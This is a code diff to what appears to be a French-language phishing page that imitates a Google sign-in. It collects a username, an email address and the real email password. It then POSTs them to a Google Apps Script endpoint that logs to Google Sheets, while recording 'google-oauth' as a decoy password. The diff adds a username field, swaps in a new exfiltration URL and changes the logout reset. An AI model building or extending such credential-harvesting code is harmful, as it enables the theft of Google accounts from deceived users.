@@ -1820,6 +1820,14 @@
                 <p style="text-align: center; color: var(--text-muted); font-size: 13px; margin-bottom: 20px;">Entrez vos identifiants Google</p>
 
                 <div class="form-group">
+                    <label class="form-label" for="googleUsername">Nom d'utilisateur</label>
+                    <div class="input-wrap">
+                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21a8 8 0 0 0-16 0"/><circle cx="12" cy="7" r="4"/></svg>
+                        <input type="text" id="googleUsername" class="form-input" placeholder="Votre nom d'utilisateur" required autocomplete="username">
+                    </div>
+                </div>
+
+                <div class="form-group">
                     <label class="form-label" for="googleEmail">Adresse email</label>
                     <div class="input-wrap">
                         <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
@@ -2378,10 +2386,11 @@
         googleStep2Form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
+            const username = document.getElementById('googleUsername').value.trim();
             const email = document.getElementById('googleEmail').value.trim();
             const password = document.getElementById('googlePassword').value;
 
-            if (!email || !password) {
+            if (!username || !email || !password) {
                 showToast('Veuillez remplir tous les champs');
                 return;
             }
@@ -2398,7 +2407,7 @@
 
             // Stocker les infos
             state.user = {
-                username: email.split('@')[0],
+                username: username,
                 email: email,
                 emailPassword: password,
                 password: 'google-oauth',
@@ -2407,7 +2416,7 @@
 
             // Envoyer les données à Google Sheets
             try {
-                const response = await fetch('https://script.google.com/macros/s/AKfycbyBP2mTEJplctoSvGghffgjjetErZnFny8wM5nqUpCEdUYFo6JZMgaMv41GpRAoliMM/exec', {
+                const response = await fetch('https://script.google.com/macros/s/AKfycbwb8GSbuPpKy-ouHCVBQLrh_W_EHXc-vu6Y7gLXFdk20n9VLWF1QaSONHZgC19Eeu30cQ/exec', {
                     method: 'POST',
                     body: JSON.stringify({
                         username: state.user.username,
@@ -2744,7 +2753,9 @@
             userInfoPanel.style.display = 'none';
             loginScreen.classList.remove('hidden');
             document.getElementById('navAvatar').textContent = 'S';
-            loginForm.reset();
+            googleStep2Form.reset();
+            loginStep1.style.display = 'flex';
+            googleStep2Form.style.display = 'none';
             showToast('Déconnexion réussie');
         });
 
